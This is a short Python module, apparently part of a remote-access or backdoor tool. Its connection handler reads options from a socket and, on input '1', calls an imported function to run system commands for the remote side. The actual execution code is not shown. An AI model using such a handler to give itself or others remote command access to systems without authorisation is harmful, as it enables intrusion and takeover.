from command import exec_command


def handleconn(mysocket):
    print("[+] handling connection ")

    while(True):
        user_input=mysocket.received_data()

        print("[+] user input ",user_input)
        if user_input=="99":
            break
        elif user_input=="1":
            print("[+] running system commands")
            exec_command(mysocket)
            # create function to run commands
        else:
            print("invalid option")
#        mysocket.send_data(user_input)
